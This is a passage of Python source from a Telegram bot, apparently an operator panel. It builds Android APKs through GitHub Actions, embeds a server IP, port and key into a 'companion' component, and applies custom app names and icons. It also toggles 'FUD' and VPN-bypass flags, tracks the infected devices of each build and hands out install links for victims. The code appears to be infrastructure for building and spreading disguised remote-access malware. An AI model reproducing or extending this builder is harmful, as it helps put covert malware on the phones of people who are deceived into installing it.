                      kb_server_config_ip(client_id, template, _cfg.get("ip", "")))

    elif data.startswith("srv_back_to_port_"):
        # srv_back_to_port_{client_id}_{template} — back from Key screen → Port screen
        rest      = data[len("srv_back_to_port_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["step"] = "port"
        buf["port"] = None
        server_config_buf[str(chat_id)] = buf
        safe_edit(chat_id, msg_id,
                  text_server_port_prompt(buf["ip"] or "", cfg=_cfg),
                  kb_server_config_port(client_id, template, _cfg.get("port", "")))

    elif data.startswith("srv_back_to_key_"):
        # srv_back_to_key_{client_id}_{template} — back from Confirm screen → Key screen
        rest      = data[len("srv_back_to_key_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        buf = server_config_buf.get(str(chat_id))
        if not buf:
            safe_edit(chat_id, msg_id, "❌ Session expired. Please start again.", kb_build())
            return
        _cfg = buf.get("_companion_cfg") or read_companion_server_config()
        buf["step"] = "key"
        buf["key"]  = None
        server_config_buf[str(chat_id)] = buf
        safe_edit(chat_id, msg_id,
                  text_server_key_prompt(buf["ip"] or "", buf["port"] or "", cfg=_cfg),
                  kb_server_config_key(client_id, template, _cfg.get("key", "")))

    elif data.startswith("template_new_"):
        # template_new_{client_id}_{template} — fresh build, go to server config entry
        rest      = data[len("template_new_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        if template == "custom":
            history = _get_custom_build_history(client_id)
            if history:
                safe_edit(chat_id, msg_id,
                          text_custom_history(client_id, history),
                          kb_custom_history(client_id, history))
            else:
                custom_build_buf[str(chat_id)] = {
                    "step": "name", "client_id": client_id,
                    "app_name": None, "icon_file_id": None,
                }
                nav_state[str(chat_id)] = {"screen": "custom_build", "message_id": msg_id}
                safe_edit(chat_id, msg_id,
                          text_custom_name_prompt(client_id),
                          kb_custom_cancel(client_id))
        else:
            _cfg = read_companion_server_config()
            server_config_buf[str(chat_id)] = {
                "step": "host_type", "host_type": None,
                "client_id": client_id, "template": template,
                "ip": None, "port": None, "key": None,
                "_companion_cfg": _cfg,
            }
            nav_state[str(chat_id)] = {"screen": "server_config", "message_id": msg_id}
            safe_edit(chat_id, msg_id,
                      text_server_host_type_prompt(client_id, template, cfg=_cfg),
                      kb_server_host_type(client_id, template))

    elif data.startswith("template_rebuild_"):
        # template_rebuild_{client_id}_{template} — show pre-filled config or collect missing port/key
        rest      = data[len("template_rebuild_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        if template == "custom":
            history = _get_custom_build_history(client_id)
            if history:
                safe_edit(chat_id, msg_id,
                          text_custom_history(client_id, history),
                          kb_custom_history(client_id, history))
            else:
                custom_build_buf[str(chat_id)] = {
                    "step": "name", "client_id": client_id,
                    "app_name": None, "icon_file_id": None,
                }
                nav_state[str(chat_id)] = {"screen": "custom_build", "message_id": msg_id}
                safe_edit(chat_id, msg_id,
                          text_custom_name_prompt(client_id),
                          kb_custom_cancel(client_id))
        else:
            # Check if last build has all 3 values stored
            _db = get_db()
            _c  = _db.execute("SELECT rdp_ip FROM clients WHERE id=?", (client_id,)).fetchone()
            _lb = _db.execute(
                "SELECT server_ip, server_port, server_key FROM builds "
                "WHERE client_id=? AND template=? "
                "ORDER BY id DESC LIMIT 1",
                (client_id, template)).fetchone()
            _db.close()
            _rdp_ip = _c["rdp_ip"] if _c else ""
            if _lb and _lb["server_ip"] and _lb["server_port"] and _lb["server_key"]:
                # All 3 values available — show pre-filled confirm screen
                safe_edit(chat_id, msg_id,
                          text_rebuild_confirm(client_id, template),
                          kb_rebuild_confirm(client_id, template))
            else:
                # Missing port/key — IP already known from rdp_ip, skip to port entry
                _cfg_rb = read_companion_server_config()
                server_config_buf[str(chat_id)] = {
                    "step":          "port",    # skip IP — already have it
                    "client_id":     client_id,
                    "template":      template,
                    "ip":            _rdp_ip,   # pre-filled from clients.rdp_ip
                    "port":          None,
                    "key":           None,
                    "is_rebuild":    True,
                    "_companion_cfg": _cfg_rb,
                }
                nav_state[str(chat_id)] = {"screen": "server_config", "message_id": msg_id}
                safe_edit(chat_id, msg_id,
                          text_server_port_prompt(_rdp_ip, cfg=_cfg_rb),
                          kb_server_config_port(client_id, template, _cfg_rb.get("port", "")))

    elif data.startswith("rebuild_confirm_"):
        # rebuild_confirm_{client_id}_{template} — trigger build with stored config
        rest      = data[len("rebuild_confirm_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        import base64 as _b64
        # Load stored config
        _db = get_db()
        _c  = _db.execute(
            "SELECT profile_name, telegram_username, rdp_ip, token, vpn_bypass FROM clients WHERE id=?",
            (client_id,)).fetchone()
        _lb = _db.execute(
            "SELECT server_ip, server_port, server_key, fud_override FROM builds "
            "WHERE client_id=? AND template=? "
            "ORDER BY id DESC LIMIT 1",
            (client_id, template)).fetchone()
        _db.close()
        _client_name  = (_c["profile_name"] or _c["telegram_username"]) if _c else ""
        _client_ip    = _c["rdp_ip"] if _c else ""
        _client_token = _c["token"] if _c else "manual"
        _build_fud    = int(_lb["fud_override"]) if _lb and "fud_override" in _lb.keys() and _lb["fud_override"] is not None else -1
        _fud_status   = str(resolve_fud(
            client_vpn_bypass   = int(_c["vpn_bypass"]) if _c and "vpn_bypass" in _c.keys() else 1,
            build_fud_override  = _build_fud,
        ))
        _ip   = (_lb["server_ip"]   if _lb and _lb["server_ip"]   else _client_ip)
        _port = (_lb["server_port"] if _lb and _lb["server_port"] else "")
        _key  = (_lb["server_key"]  if _lb and _lb["server_key"]  else "")
        # Use stored IP as the actual server host (may differ from rdp_ip if changed)
        _client_ip = _ip
        srv_host_b64 = _b64.b64encode(_ip.encode()).decode()    if _ip    else ""
        srv_port_b64 = _b64.b64encode(_port.encode()).decode() if _port  else ""
        srv_key_b64  = _b64.b64encode(_key.encode()).decode()  if _key   else ""
        emoji, display_name = TEMPLATES.get(template, ("⚙️", template))
        safe_edit(chat_id, msg_id,
                  f"🔨 <b>Rebuilding: {emoji} {display_name}</b>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  f"Client  : {_client_name}\n"
                  "🌐 Injecting into companion:\n"
                  f"IP      : <code>{_ip or '—'}</code>\n"
                  f"Port    : <code>{_port or '—'}</code>\n"
                  f"Key     : <code>{_key or '—'}</code>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  "⏳ Queuing rebuild…")
        ok = trigger_github_build(
            template=template,
            client_id=client_id,
            chat_id=str(chat_id),
            message_id=str(msg_id),
            custom_app_name="",
            custom_icon_file_id="",
            server_host_b64=srv_host_b64,
            server_port_b64=srv_port_b64,
            server_key_b64=srv_key_b64,
            client_name=_client_name,
            client_ip=_client_ip,
            client_port=_port,
            app_name=display_name,
            fud_status=_fud_status,
            client_token=_client_token,
        )
        if ok:
            _db2 = get_db()
            _db2.execute(
                "INSERT INTO builds "
                "(client_id, template, status, chat_id, message_id, server_ip, server_port, server_key) "
                "VALUES (?,?,?,?,?,?,?,?)",
                (client_id, template, "building",
                 str(chat_id), str(msg_id), _client_ip, _port, _key)
            )
            _db2.commit()
            _db2.close()
            run_id = prod_get_latest_run_id("build.yml", "main", max_wait=45)
            if run_id:
                prod_active_run[str(chat_id)] = run_id
                # Also persist run_id to DB so monitor can match after bot restart
                try:
                    _db3 = get_db()
                    _db3.execute(
                        "UPDATE builds SET github_run_id=? WHERE chat_id=? AND status='building'",
                        (str(run_id), str(chat_id))
                    )
                    _db3.commit()
                    _db3.close()
                except Exception as _e:
                    log.error(f"[rebuild] Failed to persist github_run_id to bot.db: {_e}")
            else:
                # GitHub queued slowly — retry in background and update DB when found
                def _retry_run_id_rb(_cid=str(chat_id)):
                    _late = prod_get_latest_run_id("build.yml", "main", max_wait=120)
                    if _late:
                        try:
                            _dbl = get_db()
                            _dbl.execute(
                                "UPDATE builds SET github_run_id=? WHERE chat_id=? AND status='building'",
                                (str(_late), _cid)
                            )
                            _dbl.commit()
                            _dbl.close()
                            prod_active_run[_cid] = _late
                            log.info(f"[rebuild] Late run_id {_late} saved for chat_id={_cid}")
                        except Exception as _e:
                            log.error(f"[rebuild] Background retry failed to save run_id: {_e}")
                threading.Thread(target=_retry_run_id_rb, daemon=True).start()
            if run_id or True:  # always show build UI; run_id stored async if late
                _rb_host_label = "🌐 Domain" if _ip and "." in _ip and not _ip.replace(".", "").isdigit() else "📡 IP    "
                safe_edit(chat_id, msg_id,
                          f"🔨 <b>Rebuilding: {emoji} {display_name}</b>\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n"
                          f"{_rb_host_label} : <code>{_ip or '—'}</code>\n"
                          f"🔌 Port    : <code>{_port or '—'}</code>\n"
                          f"🔑 Key     : <code>{_key or '—'}</code>\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n"
                          f"📱 App     : {display_name}\n"
                          f"🗂 Template: {emoji} {display_name}\n"
                          f"👤 Client  : {_client_name}\n"
                          f"🆔 Run     : <code>#{run_id}</code>\n"
                          f"━━━━━━━━━━━━━━━━━━━━\n"
                          f"⏳ Build queued — pipeline starting…",
                          kb_build_cancel(client_id))
        else:
            safe_edit(chat_id, msg_id,
                      "❌ <b>Failed to trigger rebuild.</b>\n"
                      "GitHub API error. Check logs.",
                      kb_build_result(client_id))

    # ── Custom build history / rebuild callbacks ──────────────────────────────

    elif data.startswith("custom_history_"):
        # custom_history_{client_id} — back to custom history screen
        client_id = int(data[len("custom_history_"):])
        history   = _get_custom_build_history(client_id)
        if history:
            safe_edit(chat_id, msg_id,
                      text_custom_history(client_id, history),
                      kb_custom_history(client_id, history))
        else:
            safe_edit(chat_id, msg_id,
                      text_custom_name_prompt(client_id),
                      kb_custom_cancel(client_id))

    elif data.startswith("custom_new_"):
        # custom_new_{client_id} — start a fresh custom build
        client_id = int(data[len("custom_new_"):])
        custom_build_buf[str(chat_id)] = {
            "step": "name", "client_id": client_id,
            "app_name": None, "icon_file_id": None,
        }
        nav_state[str(chat_id)] = {"screen": "custom_build", "message_id": msg_id}
        safe_edit(chat_id, msg_id,
                  text_custom_name_prompt(client_id),
                  kb_custom_cancel(client_id))

    elif data.startswith("custom_rebuild_confirm_"):
        # custom_rebuild_confirm_{client_id}_{build_id} — trigger rebuild of previous custom build
        rest      = data[len("custom_rebuild_confirm_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        build_id  = int(parts[1])
        import base64 as _b64cb
        _db = get_db()
        _brow = _db.execute(
            "SELECT * FROM builds WHERE id=? AND client_id=?",
            (build_id, client_id)
        ).fetchone()
        _cl = _db.execute(
            "SELECT profile_name, telegram_username, rdp_ip, token, vpn_bypass FROM clients WHERE id=?",
            (client_id,)
        ).fetchone()
        _db.close()
        if not _brow:
            safe_edit(chat_id, msg_id, "❌ Build record not found.", kb_back_home())
            return
        _app_name  = _brow["custom_app_name"]
        _icon_fid  = _brow["custom_icon_fid"] or ""
        _ip        = _brow["server_ip"]   or (_cl["rdp_ip"] if _cl else "")
        _port      = _brow["server_port"] or ""
        _key       = _brow["server_key"]  or ""
        _cname     = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
        _ctoken    = _cl["token"] if _cl else "manual"
        _bfud      = int(_brow["fud_override"]) if _brow and "fud_override" in _brow.keys() and _brow["fud_override"] is not None else -1
        _fud       = str(resolve_fud(
            client_vpn_bypass   = int(_cl["vpn_bypass"]) if _cl and "vpn_bypass" in _cl.keys() else 1,
            build_fud_override  = _bfud,
        ))
        srv_host_b64 = _b64cb.b64encode(_ip.encode()).decode()    if _ip    else ""
        srv_port_b64 = _b64cb.b64encode(_port.encode()).decode() if _port  else ""
        srv_key_b64  = _b64cb.b64encode(_key.encode()).decode()  if _key   else ""
        safe_edit(chat_id, msg_id,
                  f"🔨 <b>Rebuilding: ⚙️ {_app_name}</b>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  f"Client  : {_cname}\n"
                  "🌐 Injecting into companion:\n"
                  f"IP      : <code>{_ip or '—'}</code>\n"
                  f"Port    : <code>{_port or '—'}</code>\n"
                  f"Key     : <code>{_key or '—'}</code>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  "⏳ Queuing rebuild…")
        ok = trigger_github_build(
            template="custom",
            client_id=client_id,
            chat_id=str(chat_id),
            message_id=str(msg_id),
            custom_app_name=_app_name,
            custom_icon_file_id=_icon_fid,
            server_host_b64=srv_host_b64,
            server_port_b64=srv_port_b64,
            server_key_b64=srv_key_b64,
            client_name=_cname,
            client_ip=_ip,
            client_port=_port,
            app_name=_app_name,
            fud_status=_fud,
            client_token=_ctoken,
        )
        if ok:
            _db2 = get_db()
            _db2.execute(
                "INSERT INTO builds "
                "(client_id, template, status, chat_id, message_id, "
                "server_ip, server_port, server_key, custom_app_name, custom_icon_fid) "
                "VALUES (?,?,?,?,?,?,?,?,?,?)",
                (client_id, "custom", "building",
                 str(chat_id), str(msg_id), _ip, _port, _key, _app_name, _icon_fid)
            )
            _db2.commit()
            _db2.close()
            run_id = prod_get_latest_run_id("build.yml", "main", max_wait=45)
            if run_id:
                prod_active_run[str(chat_id)] = run_id
                try:
                    _db3b = get_db()
                    _db3b.execute(
                        "UPDATE builds SET github_run_id=? WHERE chat_id=? AND status='building'",
                        (str(run_id), str(chat_id))
                    )
                    _db3b.commit()
                    _db3b.close()
                except Exception as _e:
                    log.error(f"[custom_rebuild] Failed to persist github_run_id to bot.db: {_e}")
            else:
                # GitHub queued slowly — retry in background and update DB when found
                def _retry_run_id_crb(_cid=str(chat_id)):
                    _late = prod_get_latest_run_id("build.yml", "main", max_wait=120)
                    if _late:
                        try:
                            _dbl = get_db()
                            _dbl.execute(
                                "UPDATE builds SET github_run_id=? WHERE chat_id=? AND status='building'",
                                (str(_late), _cid)
                            )
                            _dbl.commit()
                            _dbl.close()
                            prod_active_run[_cid] = _late
                            log.info(f"[custom_rebuild] Late run_id {_late} saved for chat_id={_cid}")
                        except Exception as _e:
                            log.error(f"[custom_rebuild] Background retry failed to save run_id: {_e}")
                threading.Thread(target=_retry_run_id_crb, daemon=True).start()
            if run_id or True:  # always show build UI; run_id stored async if late
                _crb_host_label = "🌐 Domain" if _ip and "." in _ip and not _ip.replace(".", "").isdigit() else "📡 IP    "
                safe_edit(chat_id, msg_id,
                          f"🔨 <b>Rebuilding: ⚙️ {_app_name}</b>\n"
                          "━━━━━━━━━━━━━━━━━━━━\n"
                          f"{_crb_host_label} : <code>{_ip or '—'}</code>\n"
                          f"🔌 Port    : <code>{_port or '—'}</code>\n"
                          f"🔑 Key     : <code>{_key or '—'}</code>\n"
                          "━━━━━━━━━━━━━━━━━━━━\n"
                          f"📱 App     : {_app_name}\n"
                          f"🗂 Template: ⚙️ Custom\n"
                          f"👤 Client  : {_cname}\n"
                          f"🆔 Run     : <code>#{run_id}</code>\n"
                          "━━━━━━━━━━━━━━━━━━━━\n"
                          "⏳ Build queued — pipeline starting…",
                          kb_build_cancel(client_id))
        else:
            safe_edit(chat_id, msg_id,
                      "❌ <b>Failed to trigger rebuild.</b>\n"
                      "GitHub API error. Check logs.",
                      kb_build_result(client_id))

    elif data.startswith("custom_rebuild_edit_"):
        # custom_rebuild_edit_{client_id}_{build_id} — Change Config before custom rebuild
        rest      = data[len("custom_rebuild_edit_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        build_id  = int(parts[1])
        _db = get_db()
        _brow = _db.execute(
            "SELECT custom_app_name, custom_icon_fid, server_ip FROM builds WHERE id=? AND client_id=?",
            (build_id, client_id)
        ).fetchone()
        _cl = _db.execute("SELECT rdp_ip FROM clients WHERE id=?", (client_id,)).fetchone()
        _db.close()
        _app_name = _brow["custom_app_name"] if _brow else ""
        _icon_fid = _brow["custom_icon_fid"] if _brow else ""
        _rdp_ip   = (_cl["rdp_ip"] if _cl else "") or (_brow["server_ip"] if _brow else "")
        # Store buf so server config flow knows this is a custom rebuild
        custom_build_buf[str(chat_id)] = {
            "step": "server_config_only",
            "client_id":    client_id,
            "app_name":     _app_name,
            "icon_file_id": _icon_fid,
        }
        _cfg_cu = read_companion_server_config()
        server_config_buf[str(chat_id)] = {
            "step":          "host_type",
            "host_type":     None,
            "client_id":     client_id,
            "template":      "custom",
            "ip":            None,
            "port":          None,
            "key":           None,
            "_companion_cfg": _cfg_cu,
        }
        nav_state[str(chat_id)] = {"screen": "server_config", "message_id": msg_id}
        safe_edit(chat_id, msg_id,
                  text_server_host_type_prompt(client_id, "custom", cfg=_cfg_cu),
                  kb_server_host_type(client_id, "custom"))

    elif data.startswith("custom_rebuild_"):
        # custom_rebuild_{client_id}_{build_id} — show rebuild confirm for a previous custom build
        rest      = data[len("custom_rebuild_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        build_id  = int(parts[1])
        _db  = get_db()
        _brow = _db.execute(
            "SELECT * FROM builds WHERE id=? AND client_id=?",
            (build_id, client_id)
        ).fetchone()
        _db.close()
        if not _brow:
            safe_edit(chat_id, msg_id, "❌ Build record not found.", kb_back_home())
            return
        safe_edit(chat_id, msg_id,
                  text_custom_rebuild_confirm(client_id, _brow),
                  kb_custom_rebuild_confirm(client_id, build_id))

    elif data.startswith("rebuild_edit_"):
        # rebuild_edit_{client_id}_{template} — Change Config: go to server config entry
        rest      = data[len("rebuild_edit_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        # Pre-fill IP from client rdp_ip
        _db = get_db()
        _c  = _db.execute("SELECT rdp_ip FROM clients WHERE id=?", (client_id,)).fetchone()
        _db.close()
        _cfg_re = read_companion_server_config()
        server_config_buf[str(chat_id)] = {
            "step": "ip", "client_id": client_id, "template": template,
            "ip": _c["rdp_ip"] if _c else None, "port": None, "key": None,
            "_companion_cfg": _cfg_re,
        }
        nav_state[str(chat_id)] = {"screen": "server_config", "message_id": msg_id}
        safe_edit(chat_id, msg_id,
                  text_server_ip_prompt(client_id, template, cfg=_cfg_re),
                  kb_server_config_ip(client_id, template, _cfg_re.get("ip", "")))

    elif data.startswith("template_action_back_"):
        # Back from rebuild confirm → show action screen
        rest      = data[len("template_action_back_"):]
        parts     = rest.split("_", 1)
        client_id = int(parts[0])
        template  = parts[1]
        safe_edit(chat_id, msg_id,
                  text_template_action(client_id, template),
                  kb_template_action(client_id, template))

    elif data.startswith("template_"):
        # template_{client_id}_{template} — show action screen (New Build vs Rebuild Last)
        parts     = data.split("_", 2)
        client_id = int(parts[1])
        template  = parts[2]
        if template == "custom":
            # Custom has no "rebuild last" concept — go straight to name prompt
            custom_build_buf[str(chat_id)] = {
                "step": "name",
                "client_id": client_id,
                "app_name": None,
                "icon_file_id": None,
            }
            nav_state[str(chat_id)] = {
                "screen": "custom_build",
                "message_id": msg_id,
            }
            safe_edit(chat_id, msg_id,
                      text_custom_name_prompt(client_id),
                      kb_custom_cancel(client_id))
        else:
            safe_edit(chat_id, msg_id,
                      text_template_action(client_id, template),
                      kb_template_action(client_id, template))

    elif data.startswith("confirm_build_"):
        parts     = data.split("_", 3)
        client_id = int(parts[2])
        template  = parts[3]
        # Retrieve custom build data if template is custom
        cbuf = custom_build_buf.pop(str(chat_id), None)
        custom_app_name    = cbuf["app_name"] if cbuf else ""
        custom_icon_fid    = cbuf["icon_file_id"] if cbuf else ""
        # Retrieve server config
        sbuf = server_config_buf.pop(str(chat_id), None)

        # ── Fallback: if buffers lost (bot restart between config & confirm)
        # recover values from the most recent build record in the DB ──────────
        import base64
        _db_fb = get_db()
        if template == "custom" and not custom_app_name:
            _last_custom = _db_fb.execute(
                "SELECT custom_app_name, custom_icon_fid FROM builds "
                "WHERE client_id=? AND template='custom' "
                "ORDER BY id DESC LIMIT 1",
                (client_id,)
            ).fetchone()
            if _last_custom:
                custom_app_name = custom_app_name or (_last_custom["custom_app_name"] or "")
                custom_icon_fid = custom_icon_fid or (_last_custom["custom_icon_fid"] or "")
        if not sbuf or not sbuf.get("ip"):
            _last_build = _db_fb.execute(
                "SELECT server_ip, server_port, server_key FROM builds "
                "WHERE client_id=? AND server_ip IS NOT NULL AND server_ip != '' "
                "ORDER BY id DESC LIMIT 1",
                (client_id,)
            ).fetchone()
            if _last_build:
                sbuf = sbuf or {}
                sbuf.setdefault("ip",   _last_build["server_ip"]   or "")
                sbuf.setdefault("port", _last_build["server_port"] or "")
                sbuf.setdefault("key",  _last_build["server_key"]  or "")
        _db_fb.close()
        # ─────────────────────────────────────────────────────────────────────

        srv_host_b64 = base64.b64encode(
            sbuf["ip"].encode()).decode() if sbuf and sbuf.get("ip") else ""
        srv_port_b64 = base64.b64encode(
            sbuf["port"].encode()).decode() if sbuf and sbuf.get("port") else ""
        srv_key_b64  = base64.b64encode(
            sbuf["key"].encode()).decode() if sbuf and sbuf.get("key") else ""
        if template == "custom" and custom_app_name:
            display_name = custom_app_name
            emoji = "⚙️"
        else:
            emoji, display_name = TEMPLATES.get(template, ("⚙️", template))
        _host_val_cb   = sbuf['ip'] if sbuf else '—'
        _host_label_cb = "🌐 Domain" if is_domain(_host_val_cb) else "📡 IP    "
        safe_edit(
            chat_id, msg_id,
            f"🔨 <b>Building: {emoji} {display_name}</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"Client  : {client_id}\n"
            "🌐 Injecting into companion:\n"
            f"{_host_label_cb} : <code>{_host_val_cb}</code>\n"
            f"Port    : <code>{sbuf['port'] if sbuf else '—'}</code>\n"
            f"Key     : <code>{sbuf['key'] if sbuf else '—'}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⏳ Queuing build...\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "⏱ Starting..."
        )
        # Lookup client name + IP + token for APK filename and BuildConfig
        _db = get_db()
        _cl = _db.execute(
            "SELECT profile_name, telegram_username, rdp_ip, token, vpn_bypass FROM clients WHERE id=?",
            (client_id,)
        ).fetchone()
        _db.close()
        _client_name  = (_cl["profile_name"] or _cl["telegram_username"]) if _cl else ""
        # Use sbuf['ip'] as client_ip — this holds exactly what admin entered
        # (domain OR IP). Never fall back to rdp_ip which is always a raw IP.
        _client_ip    = sbuf["ip"] if sbuf and sbuf.get("ip") else (_cl["rdp_ip"] if _cl else "")
        _client_token = _cl["token"] if _cl else "manual"
        _fud_status   = str(resolve_fud(
            client_vpn_bypass = int(_cl["vpn_bypass"]) if _cl and "vpn_bypass" in _cl.keys() else 1,
        ))
        # Determine app_name: custom > template display name
        _app_name     = custom_app_name if custom_app_name else display_name
        # Port from server config buffer
        _client_port  = sbuf["port"] if sbuf and sbuf.get("port") else ""

        ok = trigger_github_build(
            template=template,
            client_id=client_id,
            chat_id=str(chat_id),
            message_id=str(msg_id),
            custom_app_name=custom_app_name,
            custom_icon_file_id=custom_icon_fid,
            server_host_b64=srv_host_b64,
            server_port_b64=srv_port_b64,
            server_key_b64=srv_key_b64,
            client_name=_client_name,
            client_ip=_client_ip,
            client_port=_client_port,
            app_name=_app_name,
            fud_status=_fud_status,
            client_token=_client_token,
        )
        if ok:
            db = get_db()
            _srv_ip   = sbuf["ip"]   if sbuf and sbuf.get("ip")   else _client_ip
            _srv_port = sbuf["port"] if sbuf and sbuf.get("port") else ""
            _srv_key  = sbuf["key"]  if sbuf and sbuf.get("key")  else ""
            db.execute(
                "INSERT INTO builds "
                "(client_id, template, status, chat_id, message_id, "
                "server_ip, server_port, server_key, custom_app_name, custom_icon_fid) "
                "VALUES (?,?,?,?,?,?,?,?,?,?)",
                (client_id, template, "building",
                 str(chat_id), str(msg_id), _srv_ip, _srv_port, _srv_key,
                 custom_app_name, custom_icon_fid)
            )
            db.commit()
            db.close()
            # ── Fetch run_id so Cancel Build works ────────────────────────────
            run_id = prod_get_latest_run_id("build.yml", "main", max_wait=12)
            if run_id:
                prod_active_run[str(chat_id)] = run_id
                try:
                    _db3c = get_db()
                    _db3c.execute(
                        "UPDATE builds SET github_run_id=? WHERE chat_id=? AND status='building'",
                        (str(run_id), str(chat_id))
                    )
                    _db3c.commit()
                    _db3c.close()
                except Exception:
                    pass
                # Update message to show Cancel button
                if template == "custom" and custom_app_name:
                    _emoji, _name = "⚙️", custom_app_name
                else:
                    _emoji, _name = TEMPLATES.get(template, ("⚙️", template))
                _q_host  = sbuf['ip']   if sbuf else '—'
                _q_port  = sbuf['port'] if sbuf else '—'
                _q_key   = sbuf['key']  if sbuf else '—'
                _q_host_label = "🌐 Domain" if _q_host and "." in _q_host and not _q_host.replace(".", "").isdigit() else "📡 IP    "
                safe_edit(
                    chat_id, msg_id,
                    f"🔨 <b>Building: {_emoji} {_name}</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"{_q_host_label} : <code>{_q_host}</code>\n"
                    f"🔌 Port    : <code>{_q_port}</code>\n"
                    f"🔑 Key     : <code>{_q_key}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 App     : {_app_name}\n"
                    f"🗂 Template: {_emoji} {_name}\n"
                    f"👤 Client  : {_client_name}\n"
                    f"🆔 Run     : <code>#{run_id}</code>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏳ Build queued — pipeline starting…",
                    kb_build_cancel(client_id)
                )
        else:
            safe_edit(
                chat_id, msg_id,
                "❌ <b>Failed to trigger build.</b>\n"
                "GitHub API error. Check logs.",
                kb_build_result(client_id)
            )

    elif data.startswith("builds_history_"):
        show_builds_history(chat_id, msg_id, int(data.split("_")[2]))

    elif data.startswith("delete_build_confirm_"):
        parts    = data.split("_")
        build_id  = int(parts[3])
        client_id = int(parts[4])
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.add(
            types.InlineKeyboardButton("✅ Yes, Delete", callback_data=f"delete_build_do_{build_id}_{client_id}"),
            types.InlineKeyboardButton("❌ Cancel",      callback_data=f"build_detail_{build_id}"),
        )
        safe_edit(chat_id, msg_id,
                  "🗑 <b>Delete Build?</b>\n"
                  "━━━━━━━━━━━━━━━━━━━━\n"
                  "This will permanently delete this build record and all its devices.\n"
                  "Are you sure?",
                  kb)

    elif data.startswith("delete_build_do_"):
        parts     = data.split("_")
        build_id  = int(parts[3])
        client_id = int(parts[4])
        try:
            db = get_db()
            db.execute("DELETE FROM devices WHERE build_id=?", (build_id,))
            db.execute("DELETE FROM builds WHERE id=?", (build_id,))
            db.commit()
            db.close()
            show_builds_history(chat_id, msg_id, client_id)
        except Exception as e:
            safe_edit(chat_id, msg_id, f"❌ Delete failed: {e}", None)

    elif data.startswith("build_detail_"):
        show_build_detail(chat_id, msg_id, int(data.split("_")[2]))

    elif data.startswith("devices_"):
        parts    = data.split("_")
        build_id = int(parts[1])
        page     = int(parts[2])
        show_devices(chat_id, msg_id, build_id, page)

    elif data.startswith("device_detail_"):
        row_id = int(data[len("device_detail_"):])
        show_device_detail(chat_id, msg_id, row_id)

    elif data.startswith("toggle_build_fud_"):
        build_id = int(data[len("toggle_build_fud_"):])
        db       = get_db()
        b        = db.execute(
            "SELECT * FROM builds WHERE id=?", (build_id,)).fetchone()
        if b:
            cur = int(b["fud_override"]) if b["fud_override"] is not None else -1
            # Cycle: -1 (inherit) → 1 (ON) → 0 (OFF) → -1
            if cur == -1:
                new_val = 1
            elif cur == 1:
                new_val = 0
            else:
                new_val = -1
            db.execute(
                "UPDATE builds SET fud_override=? WHERE id=?",
                (new_val, build_id))
            db.commit()
        db.close()
        show_build_detail(chat_id, msg_id, build_id)

    elif data.startswith("toggle_device_fud_"):
        # Format: toggle_device_fud_{device_id}_{value}
        # value: 1, 0, or -1
        rest     = data[len("toggle_device_fud_"):]
        # device_id contains no underscores in format, but to be safe split from right
        parts    = rest.rsplit("_", 1)
        device_id = parts[0]
        new_val   = int(parts[1])
        db        = get_db()
        db.execute(
            "UPDATE devices SET fud_override=? WHERE device_id=?",
            (new_val, device_id))
        db.commit()
        db.close()
        show_device_detail(chat_id, msg_id, device_id)

    elif data.startswith("client_stats_"):
        show_client_stats(chat_id, msg_id, int(data.split("_")[2]))

    elif data.startswith("rebuild_"):
        build_id = int(data.split("_")[1])
        db       = get_db()
        b        = db.execute(
            "SELECT * FROM builds WHERE id=?", (build_id,)).fetchone()
        db.close()
        if b:
            safe_edit(chat_id, msg_id,
                      text_template_select(b["client_id"]),
                      kb_template_select(b["client_id"]))

    elif data.startswith("get_apk_"):
        build_id = data[len("get_apk_"):]
        # Look up store_token for this build
        try:
            _bdb_path = os.path.join(os.path.dirname(__file__), "bot.db")
            _bdb = sqlite3.connect(_bdb_path, timeout=5)
            _bdb.row_factory = sqlite3.Row
            _row = _bdb.execute(
                "SELECT store_token, package_name, apk_size FROM builds WHERE id=? LIMIT 1",
                (build_id,)
            ).fetchone()
            _bdb.close()
        except Exception:
            _row = None

        _public_url = getattr(config, "PUBLIC_URL", "").rstrip("/")
        _store_token = (_row["store_token"] if _row else "") or ""

        if _store_token and _public_url:
            _store_url = f"{_public_url}/store/{_store_token}"
            kb = types.InlineKeyboardMarkup(row_width=1)
            kb.add(types.InlineKeyboardButton("🔗 Open Install Page", url=_store_url))
            kb.add(types.InlineKeyboardButton("🏠 Home", callback_data="nav_home"))
            safe_edit(
                chat_id, msg_id,
                f"📲 <b>Install Link</b>\n\n"
                f"Share this link with your users:\n"
                f"<code>{_store_url}</code>\n\n"
                f"They can tap it to download and install the APK directly.",
                kb
            )
        else:
            safe_edit(
                chat_id, msg_id,
                "ℹ️ APK was sent to this chat after the build completed.\n"
                "Scroll up to find it, or rebuild to get a fresh one.",
                kb_home_only()
            )

    elif data == "settings_change_pin":
        safe_edit(
            chat_id, msg_id,
